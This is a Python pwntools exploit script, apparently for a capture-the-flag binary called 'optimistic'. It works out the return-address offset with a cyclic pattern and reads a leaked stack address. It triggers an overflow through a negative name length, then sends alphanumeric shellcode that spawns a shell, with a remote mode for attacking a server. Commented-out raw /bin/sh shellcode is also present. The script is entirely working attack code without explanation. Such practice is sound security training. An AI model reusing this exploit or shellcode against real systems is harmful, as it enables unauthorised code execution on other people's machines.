#!/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:   # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(':', 'y')
    p.sendlineafter('Email:', '444')
    p.sendlineafter('Age:', '35')
    p.sendlineafter('Length of name:', '-1')
    p.sendlineafter('Name:', payload)
    p.wait()
    # Wait for the process to crash
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.eip)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP offset at {a}'.format(a=ip_offset))
    # Return the EIP offset
    return ip_offset


gdbscript = '''
pwndbg
breakrva 0x00001368
continue
'''

# Set up pwntools for the correct architecture
exe = './optimistic'
# This will automatically get contect arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
context.encoding = 'utf8'


##### EXPLOIT #####

# Pass in pattern size, gt back EIP offset
offset = find_ip(cyclic(1000))

# start program
io = start()

io.sendlineafter(':', 'y')

# get leaked stack address
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("leaked stack_addr: %#x", stack_addr)
stack_addr -= 96

shellcode = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0Vi"
#shellcode = asm(shellcraft.sh())
# shellcode =  b""
# shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
# shellcode += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00"
# shellcode += b"\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e"
# shellcode += b"\x6a\x3b\x58\x0f\x05"
#shellcode = alphanumeric(shellcode)


# build payload
payload = flat(
    [
        shellcode,
        cyclic(offset - len(shellcode)),
        stack_addr
    ]
)

io.sendlineafter('Email:', '444')
io.sendlineafter('Age:', '35')
io.sendlineafter('Length of name:', '-1')
io.sendlineafter('Name:', payload)

io.interactive()
